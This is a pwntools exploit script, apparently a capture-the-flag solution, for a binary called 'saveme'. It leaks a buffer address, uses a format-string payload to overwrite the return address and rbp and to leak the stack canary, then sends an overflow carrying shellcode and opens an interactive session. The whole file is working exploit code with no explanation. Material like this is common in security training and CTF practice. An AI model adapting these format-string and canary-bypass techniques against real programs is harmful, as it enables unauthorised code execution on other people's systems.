from pwn import *
import sys

elf = ELF("saveme")
libc = ELF("libc-2.31.so")

io = process(elf.path)
# io = remote()

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io,'''
    b *0x40151d
''')

# get buf addr
io.recvuntil(b"Here is your gift: ")
rec = io.recvline()
buf_addr = int(rec[:14].decode(), 16)
print("buf addr: " + rec[:14].decode())
flag_ptr = buf_addr - 208

shellcode = '''
pop rax
push rax
pop rdi
mov rsi, 0x405000
mov rdx, 0xf0
syscall
'''
shellcode = asm(shellcode)

print("==== shellcode ====")
print(shellcode)
print("len: " + str(len(shellcode)))
print("===================")


ret_addr_addr = buf_addr + 104
ret_addr = 0x004014f9
rbp_addr = 0x405000

b = ret_addr >> 16
payload = b"%%%dc%%14$n" % b
payload += b"%16$n"
b = (ret_addr & 0xffff) - b
payload += b"%%%dc%%15$hn" % b
b = (rbp_addr & 0xffff) - b + 0x20
payload += b"%%%dc%%17$hn" % b
payload += b"%19$p"
payload += b"A" * (48 - len(payload))
payload += p64(ret_addr_addr + 2)
payload += p64(ret_addr_addr)
payload += p64(ret_addr_addr - 8 + 2)
payload += p64(ret_addr_addr - 8)

io.sendlineafter(b"Your option: ", b"2")
io.sendlineafter(b"person: ", payload)

rec = io.recvuntil(b"AAAA")
print("canary: ")
print(rec[-20:-4].decode())
canary = int(rec[-20:-4].decode(), 16)
print("canary: " + str(hex(canary)))

payload = b"A" * 0x58
payload += p64(canary)
payload += shellcode


io.sendline(payload)

io.interactive()